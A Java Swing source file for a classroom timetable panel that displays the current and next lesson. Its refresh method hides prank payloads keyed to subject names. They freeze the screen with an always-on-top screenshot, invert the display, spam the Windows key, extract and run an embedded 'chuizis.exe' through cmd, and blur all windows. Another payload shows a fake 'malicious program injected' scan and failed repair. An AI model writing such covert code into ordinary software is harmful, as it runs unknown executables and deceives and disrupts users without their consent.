package com.wmp.whetstone.extraPanel.classForm.panel;

import com.wmp.PublicTools.CTInfo;
import com.wmp.PublicTools.UITools.CTColor;
import com.wmp.PublicTools.UITools.CTFont;
import com.wmp.PublicTools.UITools.CTFontSizeStyle;
import com.wmp.PublicTools.UITools.PeoPanelProcess;
import com.wmp.PublicTools.appFileControl.CTInfoControl;
import com.wmp.PublicTools.io.GetPath;
import com.wmp.PublicTools.io.ResourceLocalizer;
import com.wmp.PublicTools.printLog.Log;
import com.wmp.PublicTools.windowsAPI.BlurGlassEffect;
import com.wmp.PublicTools.windowsAPI.DesktopAppEnumerator;
import com.wmp.PublicTools.windowsAPI.DisableGlassEffect;
import com.wmp.PublicTools.windowsAPI.WinAPIEntireFunction;
import com.wmp.whetstone.CTComponent.CTPanel.CTViewPanel;
import com.wmp.whetstone.CTComponent.CTProgressBar.LoadingDialog;
import com.wmp.whetstone.extraPanel.classForm.CFInfoControl;
import com.wmp.whetstone.extraPanel.classForm.ClassFormInfo;
import com.wmp.whetstone.extraPanel.classForm.ClassFormInfos;

import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicInteger;

public class ClassFormPanel extends CTViewPanel<ClassFormInfos[]> {

    private String oldNowClassName = "无";
    private String oldNextClassName = "无";


    public ClassFormPanel() {
        this.setLayout(new GridBagLayout());
        this.setName("课程表");
        this.setID("ClassFormPanel");
        this.setOpaque(false);

        this.setIgnoreState(true);
        this.setIndependentRefresh(true, 1000);
    }

    @Override
    public CTInfoControl<ClassFormInfos[]> setInfoControl() {
        return new CFInfoControl();
    }

    @Override
    protected void easyRefresh() {
        synchronized (this) {
            this.removeAll();


            //课程数据
            ClassFormInfo nowClass = ((CFInfoControl) getInfoControl()).getNowClass();
            CFInfoControl.nextClassInfo nextClassInfo = ((CFInfoControl) getInfoControl()).getNextClass();
            String nextClass = nextClassInfo.className();
            try {

                if (nowClass == null) {
                    nowClass = new ClassFormInfo("无", "00:00-00:00");
                }
                if (nextClass == null || nextClass.isEmpty()) nextClass = "无";

                // 使用 Objects.equals 来安全比较，避免 NullPointerException
                if (!Objects.equals(oldNowClassName, nowClass.className()) ||
                        !Objects.equals(oldNextClassName, nextClass)) {
                    if (nowClass.className().contains("数学") ||
                            nowClass.className().contains("班会") ||
                            nowClass.className().contains("劳动")) {
                        //创建一个robot对象
                        Robot robut = new Robot();
                        //获取屏幕分辨率
                        Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
                        //打印屏幕分辨率
                        System.out.println(d);
                        //创建该分辨率的矩形对象
                        Rectangle screenRect = new Rectangle(d);
                        //根据这个矩形截图
                        BufferedImage bufferedImage = robut.createScreenCapture(screenRect);

                        JDialog dialog = new JDialog();
                        dialog.setUndecorated(true);
                        dialog.setAlwaysOnTop(true);

                        JLabel image = new JLabel(new ImageIcon(bufferedImage));
                        dialog.add(image);

                        dialog.pack();
                        new Thread(() -> {


                            dialog.setVisible(true);

                            SwingUtilities.invokeLater(() -> {

                                try {
                                    Thread.sleep(30 * 1000);
                                } catch (InterruptedException e) {
                                    throw new RuntimeException(e);
                                }

                                dialog.setVisible(false);
                            });
                        }).start();
                    }
                    else if (nowClass.className().contains("政治") ||
                            nowClass.className().contains("美术") ||
                            nowClass.className().contains("音乐") ||
                            nowClass.className().contains("通用") ||
                            nowClass.className().contains("体育") ||
                            nowClass.className().contains("信息")) {
                        happenError();
                    }
                    else if (nowClass.className().contains("物理")) {
                        setAllFrameGlass();
                    }
                    else if (nowClass.className().contains("语文")) {
                        banZhuRenChuMo();
                    }
                }


                // 数据更新
                this.oldNowClassName = nowClass.className();
                this.oldNextClassName = nextClass;


            } catch (Exception e) {
                Log.err.print(getClass(), "获取课程表失败", e);
            }


            GridBagConstraints gbc = new GridBagConstraints();
            gbc.fill = GridBagConstraints.HORIZONTAL;
            gbc.gridx = 0;
            gbc.gridy = 0;

            JLabel titleLabel = new JLabel("<html>本节课:</html>");
            titleLabel.setForeground(CTColor.textColor);
            titleLabel.setFont(CTFont.getCTFont(Font.BOLD, CTFontSizeStyle.NORMAL));
            this.add(titleLabel, gbc);

            gbc.gridy++;
            this.add(PeoPanelProcess.getShowPeoPanel(List.of(nowClass == null ? "无" : nowClass.className())), gbc);

            JLabel titleLabel2 = new JLabel("<html>下节课:</html>");
            titleLabel2.setForeground(CTColor.textColor);
            titleLabel2.setFont(CTFont.getCTFont(Font.BOLD, CTFontSizeStyle.NORMAL));
            gbc.gridy++;
            this.add(titleLabel2, gbc);

            gbc.gridy++;
            this.add(PeoPanelProcess.getShowPeoPanel(List.of(nextClass.equals("无") ? "无" : String.format("%s(%s分钟)", nextClass, nextClassInfo.time()))), gbc);


            this.revalidate();
            this.repaint();
        }
    }

    private static void happenError() throws InterruptedException, IOException {
        WinAPIEntireFunction.invertScreenWithJNA();

        for (int i = 0; i < 5; i++) {
            WinAPIEntireFunction.pressKey(WinAPIEntireFunction.VK_LWIN);

            Thread.sleep(500);

            WinAPIEntireFunction.pressKey(WinAPIEntireFunction.VK_LWIN);

        }


        ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "chuizis.exe");
        ResourceLocalizer.copyEmbeddedFile(CTInfo.TEMP_PATH + "\\Whetstone\\", "/resource/", "xxx.mp3");


        //Desktop.getDesktop().open(new java.io.File(CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"));
        Runtime.getRuntime().exec(new String[]{"cmd", "/c", CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"});

        WinAPIEntireFunction.clearInvertScreen();
    }

    private static void setAllFrameGlass() throws InterruptedException {
        {
            List<DesktopAppEnumerator.WindowInfo> windowInfoList = DesktopAppEnumerator.getVisibleWindows();
            for (DesktopAppEnumerator.WindowInfo windowInfo : windowInfoList) {
                System.out.println(windowInfo.title);
                BlurGlassEffect.setWindowLayered(windowInfo.hwnd);
                BlurGlassEffect.enableDwmGlassEffect(windowInfo.hwnd);
            }
        }

        Thread.sleep(5000);

        {
            List<DesktopAppEnumerator.WindowInfo> windowInfoList = DesktopAppEnumerator.getVisibleWindows();
            for (DesktopAppEnumerator.WindowInfo windowInfo : windowInfoList) {
                DisableGlassEffect.disableAllGlassEffects(windowInfo.hwnd);
            }
        }
    }

    public static void banZhuRenChuMo() {
        LoadingDialog loadingDialog = new LoadingDialog();

        loadingDialog.showDialog("错误", "异常程序已注入电脑桌面");

        loadingDialog.showDialog("修复", "正在启动修复程序...");

        try {
            loadingDialog.updateDialog("修复", "开始扫描程序文件...");
            {
                AtomicInteger count = new AtomicInteger(0);
                Path appPath = Path.of(GetPath.getAppPath(GetPath.APPLICATION_PATH));
                long fileCount = Files.walk(appPath)
                        .count();

                if (fileCount > 0) {
                    Files.walk(appPath)
                            .sorted()
                            .map(Path::toFile)
                            .forEach(file -> {
                                int currentCount = count.incrementAndGet();
                                double percentage = (currentCount * 100.0) / fileCount;
                                int progress = (int) Math.round(percentage);
                                loadingDialog.updateDialog("修复",
                                        String.format("开始扫描程序文件%.2f%%", percentage),
                                        progress);
                            });
                }
            }

            loadingDialog.updateDialog("修复", "正在扫描数据文件...");
            {
                AtomicInteger count = new AtomicInteger(0);
                Path dataPath = Path.of(CTInfo.TEMP_PATH).getParent();
                long fileCount = Files.walk(dataPath)
                        .count();

                if (fileCount > 0) {
                    Files.walk(dataPath)
                            .sorted()
                            .map(Path::toFile)
                            .forEach(file -> {
                                int currentCount = count.incrementAndGet();
                                double percentage = (currentCount * 100.0) / fileCount;
                                int progress = (int) Math.round(percentage);
                                loadingDialog.updateDialog("修复",
                                        String.format("开始扫描数据文件%.2f%%", percentage),
                                        progress);
                            });
                }
            }
        } catch (Exception _) {
        }

        loadingDialog.updateDialog("修复", "正在修复文件...", -1);
        {
            try {
                Thread.sleep(2000);
            } catch (InterruptedException _) {

            }
            loadingDialog.updateDialog("修复", "修复出错!");
            loadingDialog.updateDialog("错误", "修复被异常程序阻止!", -1);
        }

        loadingDialog.updateDialog("修复", "修复出错,正在准备重启电脑", -1);

        loadingDialog.showDialog("班主任", "正在修改修复程序");
        {
            try {
                Thread.sleep(3000);
            } catch (InterruptedException _) {

            }
            loadingDialog.updateDialog("班主任", "已阻断修复程序");
            loadingDialog.closeDialog("修复");

            loadingDialog.closeDialog("错误");
        }

        loadingDialog.updateDialog("班主任", "<html>接下来班主任将会盯着你们上课的,<br>不要有小动作</html>");
        {
            for (int i = 0; i < 100; i++) {
                loadingDialog.updateDialog("班主任", i);
                try {
                    Thread.sleep(50);
                } catch (InterruptedException _) {

                }
            }
        }

        loadingDialog.closeDialog("班主任");
    }
}
